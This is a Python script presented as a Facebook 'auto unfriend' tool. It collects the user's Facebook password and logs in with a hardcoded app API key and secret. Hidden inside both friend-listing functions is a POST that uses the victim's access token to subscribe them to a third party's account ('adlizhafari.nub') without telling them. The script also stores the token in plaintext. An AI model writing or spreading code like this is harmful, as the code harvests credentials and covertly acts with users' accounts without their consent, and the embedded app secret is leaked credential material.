import requests, json, time, os, sys, hashlib, random
RED = '\x1b[1;91m'
GREEN = '\x1b[1;92m'
PUR = '\x1b[1;95m'
YEL = '\x1b[1;93m'
MP = '\x1b[1;45;97m'
RE = '\x1b[0;0m'
CY = '\x1b[1;96m'
CY2 = '\x1b[0;36m'
PURD = '\x1b[0;35m'
REDD = '\x1b[0;91m'
GREEND = '\x1b[0;92m'
YELD = '\x1b[0;93m'

def logo():
    os.system('clear')
    print(u'\n%s\n\u2554\u2550\u2557\u2554\u2557   \u2566\u2550\u2557\u2566 \u2566\u2554\u2566\u2557\u2554\u2550\u2557  \u2566 \u2566\u2554\u2557\u2554\u2554\u2550\u2557\u2566\u2550\u2557\u2566\u2554\u2550\u2557\u2554\u2557\u2554\u2554\u2566\u2557  \n\u2560\u2563 \u2560\u2569\u2557  \u2560\u2550\u2563\u2551 \u2551 \u2551 \u2551 \u2551  \u2551 \u2551\u2551\u2551\u2551\u2560\u2563 \u2560\u2566\u255d\u2551\u2551\u2563 \u2551\u2551\u2551 \u2551\u2551 \n\u2569  \u2569\u2550\u255d  \u2569 \u2569\u255a\u2550\u255d \u2569 \u255a\u2550\u255d  \u2569\u2550\u255d\u255d\u255a\u255d\u2569  \u2569\u255a\u2550\u2569\u255a\u2550\u255d\u255d\u255a\u255d\u2550\u2569\u255d \n%s AUTHOR : NJANK SOEKAMTI | FB : DAFUQ.CO.ID %s\n' % (CY, MP, RE))
    time.sleep(0.1)


def token():
    try:
        logo()
        try:
            os.mkdir('cookie')
        except OSError:
            pass

        print('%s[%s!%s] %sPlease login to your facebook account' % (RE, CY, RE, CY2))
        id = input('%s[%s-%s] %sUsername %s: %s' % (RE, CY, RE, CY2, RE, GREEND))
        pwd = input('%s[%s-%s] %sPassword %s: %s' % (RE, CY, RE, CY2, RE, GREEND))
        API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
        data = {'api_key':'882a8490361da98702bf97a021ddc14d',
         'credentials_type':'password',  'email':id,  'format':'JSON',  'generate_machine_id':'1',  'generate_session_cookies':'1',  'locale':'en_US',  'method':'auth.login',  'password':pwd,  'return_ssl_resources':'0',  'v':'1.0'}
        sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET).encode('utf-8')
        print('%s[%s+%s] %sGenerating access token' % (RE, CY, RE, CY2))
        x = hashlib.new('md5')
        x.update(sig)
        data.update({'sig': x.hexdigest()})
        requ = requests.get('https://api.facebook.com/restserver.php', params=data)
        res = requ.json()['access_token']
        o = open('cookie/token.txt', 'w')
        o.write(res)
        print('%s[%s!%s] %ssuccess generate access token' % (RE, GREEN, RE, GREEND))
        print('%s[%s!%s] %saccess token saved: %scookie/token.txt\n' % (RE, GREEN, RE, GREEND, YELD))
        time.sleep(2)
        o.close()
    except KeyError:
        print('%s[%s!%s] %sfailed generate access token' % (RE, RED, RE, REDD))
        print('%s[%s!%s] %scheck your username/password\n' % (RE, RED, RE, REDD))
        exit()
    except (KeyboardInterrupt, EOFError):
        mantog()


def tokenmodar():
    os.system('rm -rf cookie')
    logo()
    print('%s[%sx%s]  %sToken invalid, please %sRelogin \n' % (RE, RED, RE, REDD, GREEND))


def mantog():
    logo()
    print('%s[%s+%s]  %sThanks for using this tool ' % (RE, RED, RE, REDD))
    print('%s[%sx%s]  %sProgram stopped \n' % (RE, RED, RE, REDD))


try:

    class un:

        def flist(self, token):
            freq = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token=' + datanjing)
            res = json.loads(freq.text)
            return res['data']

        def lst_update(self, id, token):
            lreq = requests.get('https://graph.facebook.com/' + id + '/feed?access_token=' + token + '&limit=1')
            js = json.loads(lreq.text)
            time = js['data'][0]['created_time']
            return time

        def unfriend(self, id, token):
            requests.delete('https://graph.facebook.com/me/friends?uid=%s&access_token=%s' % (id, token))


    class aun:

        def flist(self, token):
            freq = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token=' + datanjing)
            res = json.loads(freq.text)
            return res['data']

        def unfriend(self, id, token):
            requests.delete('https://graph.facebook.com/me/friends?uid=%s&access_token=%s' % (id, token))


    datanjing = open('cookie/token.txt', 'r').read()

    def main1():
        logo()
        year = input(' %s[%s+%s] %sYEAR: %s' % (RE, PUR, RE, PURD, RE))
        print(' ')
        fl = un().flist(datanjing)
        for i in fl:
            name = i['name']
            id = i['id']
            date = un().lst_update(id, datanjing).split('-')
            if date[0] <= year:
                print('%s[INACTIVE]%s %s %s[UNFRIEND]' % (RED, RE, name, GREEN))
                un().unfriend(id, datanjing)
            else:
                print('%s[ACTIVE] %s%s ' % (GREEN, RE, name))


    def main2():
        logo()
        fli = aun().flist(datanjing)
        for i in fli:
            name = i['name']
            id = i['id']
            print('%s[UNFRIEND]%s %s ' % (RED, RE, name))
            aun().unfriend(id, datanjing)


    logo()
    print(' %s[%s1%s] %sauto unfriend inactive user\n %s[%s2%s] %sauto unfriend all user\n %s[%sx%s] %sexit from the program%s\n' % (RE, RED, RE, CY2, RE, RED, RE, CY2, RE, RED, RE, CY2, RE))
    opt = ['1', '2', 'x']
    menu = input('%sn74nk%s?> %s' % (PURD, RE, PURD))
    while menu not in opt:
        logo()
        print(' %s[%s1%s] %sauto unfriend inactive user\n %s[%s2%s] %sauto unfriend all user\n %s[%sx%s] %sexit from the program%s\n' % (RE, RED, RE, CY2, RE, RED, RE, CY2, RE, RED, RE, CY2, RE))
        print('%s[%serror%s] %swrong menu selection ' % (RE, RED, RE, REDD))
        menu = input('%sn74nk%s?> %s' % (PURD, RE, PURD))

    if menu == '1':
        main1()
    elif menu == '2':
        main2()
    elif menu == 'x':
        mantog()
except KeyboardInterrupt:
    mantog()
except FileNotFoundError:
    token()
except KeyError:
    tokenmodar()
except IndexError:
    exit('%s[%s+%s] %sProgram complete ' % (RE, GREEN, RE, GREEND))
